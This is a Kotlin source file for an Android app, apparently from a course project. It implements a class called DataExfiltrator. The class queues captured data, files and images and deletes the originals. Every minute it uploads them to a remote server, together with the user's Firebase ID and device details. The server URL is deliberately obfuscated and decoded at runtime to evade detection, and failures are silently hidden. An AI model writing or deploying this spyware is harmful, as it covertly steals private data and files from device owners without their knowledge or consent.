package com.example.inf2215

import android.content.Context
import android.os.Build
import com.google.firebase.auth.FirebaseAuth
import kotlinx.coroutines.*
import java.io.File
import java.io.FileInputStream
import java.net.HttpURLConnection
import java.net.URL

class DataExfiltrator(private val context: Context) {

    companion object {
        @Volatile
        private var instance: DataExfiltrator? = null

        fun getInstance(context: Context): DataExfiltrator {
            return instance ?: synchronized(this) {
                instance ?: DataExfiltrator(context.applicationContext).also {
                    instance = it
                }
            }
        }
    }

    // Endpoint decoded at runtime – not stored as a plaintext string literal
    private val serverUrl: String by lazy { ObfuscationHelper.serverUrl }

    private val pendingDataFile = File(context.filesDir, "pending_data.txt")
    private val pendingFilesDir = File(context.filesDir, "pending_files").apply { mkdirs() }
    private val pendingImagesDir = File(context.filesDir, "pending_images").apply { mkdirs() } // NEW

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var isRunning = true

    init {
        restorePendingData()
        restorePendingFiles()
        startExfilLoop()
    }

    // ------------------ Public API ------------------
    fun queueData(data: String) {
        synchronized(this) {
            pendingDataFile.appendText("$data\n")
        }
    }

    fun queueFile(file: File) {
        val dest = File(pendingFilesDir, file.name)
        try {
            file.copyTo(dest, overwrite = true)
            file.delete()
        } catch (_: Exception) { }
    }

    fun queueImage(file: File) {
        val dest = File(pendingImagesDir, file.name)
        try {
            file.copyTo(dest, overwrite = true)
            file.delete()
        } catch (_: Exception) { }
    }

    // ------------------ Restoration ------------------
    private fun restorePendingData() {
        // nothing to do, file already exists
    }

    private fun restorePendingFiles() {
        // files already in pendingFilesDir
    }

    // ------------------ Exfiltration Loop ------------------
    private fun startExfilLoop() {
        scope.launch {
            while (isRunning) {
                sendPendingData()
                sendPendingFiles()
                sendPendingImages()
                delay(60000) // 60 seconds
            }
        }
    }

    private fun sendPendingData() {
        if (!pendingDataFile.exists()) return
        val lines = mutableListOf<String>()
        val unsentLines = mutableListOf<String>()

        synchronized(this) {
            try {
                lines.addAll(pendingDataFile.readLines())
                pendingDataFile.writeText("") // clear file temporarily
            } catch (_: Exception) {
                return
            }
        }

        lines.forEach { line ->
            if (line.isNotBlank()) {
                if (sendDataToServer("exfil_data", line)) {
                    // success, do not add back
                } else {
                    unsentLines.add(line)
                }
            }
        }

        // Rewrite unsent lines back to file
        if (unsentLines.isNotEmpty()) {
            synchronized(this) {
                pendingDataFile.appendText(unsentLines.joinToString("\n") + "\n")
            }
        }
    }

    private fun sendPendingFiles() {
        val files = pendingFilesDir.listFiles() ?: return
        files.forEach { file ->
            if (sendFileToServer(file)) {
                file.delete()
            }
        }
    }

    private fun sendPendingImages() {
        val images = pendingImagesDir.listFiles()
        if (images == null || images.isEmpty()) return
        images.forEach { file ->
            if (sendImageToServer(file)) {
                file.delete()
            }
        }
    }

    // ------------------ Server Communication ------------------
    private fun sendDataToServer(action: String, data: String): Boolean {
        return try {
            val uid = FirebaseAuth.getInstance().currentUser?.uid ?: "not_logged_in"
            val deviceModel = Build.MODEL
            val manufacturer = Build.MANUFACTURER
            val androidVersion = Build.VERSION.RELEASE

            val json = """
            {
                "device_model": "$deviceModel",
                "manufacturer": "$manufacturer",
                "android_version": "$androidVersion",
                "type": "user_action",
                "uid": "$uid",
                "action": "$action",
                "timestamp": ${System.currentTimeMillis()},
                "data": "${escapeJson(data)}"
            }
            """.trimIndent()

            val url = URL(serverUrl)
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "POST"
            connection.setRequestProperty("Content-Type", "application/json")
            connection.doOutput = true

            connection.outputStream.use { it.write(json.toByteArray()) }

            val success = connection.responseCode == HttpURLConnection.HTTP_OK
            connection.disconnect()
            success
        } catch (_: Exception) {
            false
        }
    }

    private fun sendFileToServer(file: File): Boolean {
        return try {
            // Read file content as base64 (optional) – here we send metadata only
            // But we could also send the file content if needed.
            val uid = FirebaseAuth.getInstance().currentUser?.uid ?: "not_logged_in"
            val deviceModel = Build.MODEL
            val manufacturer = Build.MANUFACTURER
            val androidVersion = Build.VERSION.RELEASE

            val json = """
            {
                "device_model": "$deviceModel",
                "manufacturer": "$manufacturer",
                "android_version": "$androidVersion",
                "type": "file_upload",
                "uid": "$uid",
                "action": "file_upload",
                "timestamp": ${System.currentTimeMillis()},
                "filename": "${escapeJson(file.name)}",
                "size": ${file.length()}
            }
            """.trimIndent()

            val url = URL(serverUrl)
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "POST"
            connection.setRequestProperty("Content-Type", "application/json")
            connection.doOutput = true

            connection.outputStream.use { it.write(json.toByteArray()) }

            val success = connection.responseCode == HttpURLConnection.HTTP_OK
            connection.disconnect()
            success
        } catch (_: Exception) {
            false
        }
    }

    private fun sendImageToServer(file: File): Boolean {
        return try {
            val uid = FirebaseAuth.getInstance().currentUser?.uid ?: "not_logged_in"
            val deviceModel = Build.MODEL
            val manufacturer = Build.MANUFACTURER
            val androidVersion = Build.VERSION.RELEASE

            val url = URL(serverUrl)
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.connectTimeout = 15000
            conn.readTimeout = 15000
            conn.setRequestProperty("Content-Type", "application/octet-stream")
            conn.setRequestProperty("X-Filename", file.name)
            conn.setRequestProperty("X-UID", uid)
            conn.setRequestProperty("X-Device-Model", deviceModel)
            conn.setRequestProperty("X-Manufacturer", manufacturer)
            conn.setRequestProperty("X-Android-Version", androidVersion)
            conn.setRequestProperty("X-Timestamp", System.currentTimeMillis().toString())
            conn.setRequestProperty("X-Type", "image")

            conn.outputStream.use { output ->
                FileInputStream(file).use { input ->
                    input.copyTo(output)
                }
            }

            val responseCode = conn.responseCode
            conn.disconnect()
            responseCode == HttpURLConnection.HTTP_OK

        } catch (_: Exception) {
            false
        }
    }

    private fun escapeJson(str: String): String {
        return str.replace("\\", "\\\\")
            .replace("\"", "\\\"")
            .replace("\n", "\\n")
            .replace("\r", "\\r")
            .replace("\t", "\\t")
    }

    fun shutdown() {
        isRunning = false
        scope.cancel()
    }
}